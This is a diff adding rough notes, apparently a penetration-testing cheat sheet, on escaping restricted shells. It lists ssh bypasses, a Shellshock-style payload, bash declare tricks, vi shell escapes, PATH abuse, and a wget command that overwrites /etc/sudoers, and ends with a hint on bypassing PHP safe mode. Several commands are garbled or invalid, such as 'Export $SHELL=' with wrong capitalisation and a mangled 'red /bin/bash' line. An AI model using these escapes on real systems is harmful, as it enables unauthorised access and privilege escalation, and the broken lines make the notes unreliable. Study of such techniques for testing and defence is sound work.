@@ -1,0 +1,93 @@
+Via ssh 
+Ssh <target> bash
+
+#there will be no answer but jsut start typing your commands
+                 Or
+ssh <target> -t bash
+
+or
+
+
+Ssh <target> /bin/bash --noprofile –-norc
+
+#there will be no output so just start typing commands
+
+                     or
+
+ssh <target> -t “bash —noprofile -i”
+
+After that 
+
+Export $SHELL=/bin/bash
+Export $PATH=<copy_value_from_attacker_machine>
+
+or
+
+ssh <target> -t "() { :; }; sh -i "
+
+
+
+
+declare
+
+declare -n PATH; export PATH=/bin;bash -i
+ 
+BASH_CMDS[shell]=/bin/bash;shell -i
+
+
+wget
+you could overwrite e.g sudoers file
+wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
+
+
+create an executable file with /bin/bash as content
+red /bin/bash
+> w wx/path #Write /bin/bash in a writable and executable path
+
+
+Vi
+Vi
+:/bin/bash 
+ Or
+/bin/sh
+Or
+!sh
+
+
+After that 
+Export $SHELL=/bin/bash
+Export $PATH=<copy_value_from_attacker_machine>
+
+or
+
+:set shell=/bin/sh
+:shell
+
+modify PATH
+Echo $PATH
+
+you will get the result like: 
+PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+
+copy and paste the path <path_till_the_first_:> and hit TAB a few times  and you will get bins that can be used to escape from the jail  so go to the gtfobins and do what gtfobins says
+ 
+After that
+
+Export $SHELL=/bin/bash
+Export $PATH=<copy_value_from_attacker_machine>
+
+                        or
+
+hit TAB a few times  and you will get bins that can be used so go to the gtfobins and do what gtfobins says
+ 
+After that
+
+Export $SHELL=/bin/bash
+Export $PATH=<copy_value_from_attacker_machine>
+
+62)How to escape from PHP save mode
+
+Print_r(File_get_contents()) and file_put_contents() and print_r(scandir()) 
+
+
+
